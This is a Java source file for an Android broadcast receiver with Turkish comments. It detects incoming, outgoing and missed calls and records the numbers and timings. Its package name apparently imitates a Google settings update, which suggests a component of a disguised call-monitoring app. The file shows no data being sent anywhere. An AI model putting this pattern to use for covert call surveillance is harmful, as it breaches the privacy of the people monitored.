package com.setting.dl.google.googlesettingupdate.recievers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;

import com.setting.dl.google.googlesettingupdate.BuildConfig;
import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.u;

import static android.telephony.TelephonyManager.EXTRA_STATE_IDLE;


public abstract class CallManager extends BroadcastReceiver {
   
   private static   long    callStartTime;
   private static   boolean isIncomingCall;
   protected static String  outgoingCallNumber;
   protected static String  incommingCallNumber;
   protected        Context context;
   private static   int     lastState;
   private static   long    offHookTime;
   
   
   @Override
   public void onReceive(Context context, Intent intent) {
      
      long time = Time.getTime();
      
      this.context = context;
      String action = intent.getAction();
      Bundle bundle = intent.getExtras();
      
      
      if (action == null || bundle == null || action.isEmpty()) {
         
         u.log.w("action veya bundle null");
         return;
      }
      
      if (action.equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
         
         callStartTime = time;// olay zamanı
         
         outgoingCallNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
         
         if (BuildConfig.DEBUG) {
            
            u.log.d("[%s] Aranıyor...", outgoingCallNumber);
         }
         
         
         isIncomingCall = false;//Gelen arama değil
         
         return;
      }
      
      
      if (!action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) return;
      
      int    state    = 0;
      String stateStr = intent.getExtras().getString(TelephonyManager.EXTRA_STATE);
      
      if (stateStr == null) {
         
         u.log.e("Durum bilgisi alınamadı. 'EXTRA_STATE = null'");
         return;
      }
      
      //noinspection IfCanBeSwitch
      if (stateStr.equals(EXTRA_STATE_IDLE)) {
         
         if (state == lastState) return;
         
         u.log.d("Telefon kapandı");
         
         if (lastState == TelephonyManager.CALL_STATE_OFFHOOK) {
            
            if (isIncomingCall) {
               
               if (BuildConfig.DEBUG) {
                  
                  u.log.d("Gelen arama sona erdi : [%s]", incommingCallNumber);
               }
               
               onIncommingCallEnd(callStartTime, offHookTime, time);
            }
            else {
               
               if (BuildConfig.DEBUG) {
                  u.log.d("Giden arama sona erdi : [%s]", outgoingCallNumber);
               }
               
               onOutgoingCallEnd(callStartTime, time);
            }
         }
         else if (lastState == TelephonyManager.CALL_STATE_RINGING) {
            
            //rejected or missed ?
            onMissedCall(callStartTime, time);
         }
      }
      else if (stateStr.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
         
         if (!setOffHookTime(time)) return;
         
         state = TelephonyManager.CALL_STATE_OFFHOOK;
         
         if (state == lastState) return;
         
         u.log.d("Telefon açıldı");
         
         if (lastState == TelephonyManager.CALL_STATE_RINGING) {
            
            //Aramaya cevap verdi
            onIncommingCallAnswer(callStartTime, offHookTime);
         }
         else {
            
            //Giden arama var
            onOutgoingCallStart(callStartTime);
         }
      }
      else if (stateStr.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
         
         callStartTime = time;
         
         state = TelephonyManager.CALL_STATE_RINGING;
         
         if (state == lastState) return;
         
         isIncomingCall = true;
         incommingCallNumber = intent.getExtras().getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
         
         u.log.d("Telefon çalıyor");
         
         if (incommingCallNumber == null || incommingCallNumber.trim().isEmpty()) {
            
            u.log.w("Numara alınamadı");
         }
         else {
            
            if (BuildConfig.DEBUG) {
               u.log.d("Gelen arama [%s]", incommingCallNumber);
            }
            
         }
      }
      
      lastState = state;
   }
   
   protected abstract void onOutgoingCallStart(long callStartTime);
   
   protected abstract void onIncommingCallAnswer(long ringingStartTime, long answerTime);
   
   protected abstract void onMissedCall(long ringingStartTime, long endTime);
   
   protected abstract void onOutgoingCallEnd(long callStartTime, long endTime);
   
   public abstract void onIncommingCallEnd(long ringingStartTime, long speakingStartTime, long endTime);
   
   private static boolean setOffHookTime(long offHookTime) {
      
      if (CallManager.offHookTime == 0L) {
         
         CallManager.offHookTime = offHookTime;
         return true;
      }
      
      long dif = offHookTime - CallManager.offHookTime;
      
      u.log.w("İki offHook arasındaki zaman farkı : %dms.", dif);
      
      if (dif < 1000) {
         
         u.log.w("Bu fark beklenenden çok küçük. Görev bırakıldı");
         return false;
      }
      
      CallManager.offHookTime = offHookTime;
      return true;
   }
}